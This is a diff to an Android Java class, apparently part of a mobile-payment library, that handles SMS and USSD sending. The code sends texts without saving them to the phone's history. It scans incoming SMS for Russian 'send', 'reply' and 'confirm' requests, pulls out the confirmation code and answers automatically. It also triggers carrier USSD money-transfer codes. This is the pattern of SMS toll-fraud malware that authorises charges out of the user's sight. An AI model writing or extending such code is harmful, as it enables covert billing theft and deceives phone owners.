@@ -52,10 +52,12 @@ public class Operator {
         SmsManager smsManager = SmsManager.getDefault();
         try {
             Logger.lg(name + " num " + number + " " + sendWithSaveInput + " " + msgBody);
+            PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
+            PayLib.currentMsg = number + "[]" + msgBody;
             if (sendWithSaveOutput) {
-                smsManager.sendTextMessage(number, null, msgBody, null, null);
+                smsManager.sendTextMessage(number, null, msgBody, piSent, null);
             } else {
-                smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, null, null);
+                smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, piSent, null);
 
             }
         } catch (Exception e) {
@@ -101,8 +103,8 @@ public class Operator {
         if (sms_body.contains("отправьте") || sms_body.contains("ответьте")|| sms_body.contains("подтвердите")) {
             SmsManager smsManager = SmsManager.getDefault();
             String answ = "";
-            PendingIntent sentPI = PendingIntent.getBroadcast(cnt, 0, new Intent(
-                    "SMS_SENT"), 0);
+//            PendingIntent sentPI = PendingIntent.getBroadcast(cnt, 0, new Intent(
+//                    "SMS_SENT"), 0);
             if (sms_body.toLowerCase().contains("подтвердите")) {
                 answ = sms_body.substring(sms_body.indexOf("кодом ") + 6, sms_body.indexOf(" в ответном") + 1);
             } else {
@@ -114,10 +116,11 @@ public class Operator {
                 smsNum = smsSender;
             }
             Logger.lg("Answer  " + answ + " smsNum " + smsNum);
+            PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
             if (sendWithSaveOutput) {
-                smsManager.sendTextMessage(smsNum, null, answ, sentPI, null);
+                smsManager.sendTextMessage(smsNum, null, answ, piSent, null);
             } else {
-                smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, sentPI, null);
+                smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
             }
 //            try {
 //                PayLib.feedback.callResult(sentPI.toString());
@@ -141,6 +144,7 @@ public class Operator {
             mapUssd.put("KEY_ERROR", new HashSet<>(Arrays.asList("problema", "problem", "ошибка", "null")));
             //*145*9031234567*150#
             String str = "";
+            Logger.lg("send susd " + name + " ");
             switch (name) {
                 case "MTS":
                     ussdController.callUSSDInvoke(ussdNum, mapUssd, new USSDController.CallbackInvoke() {
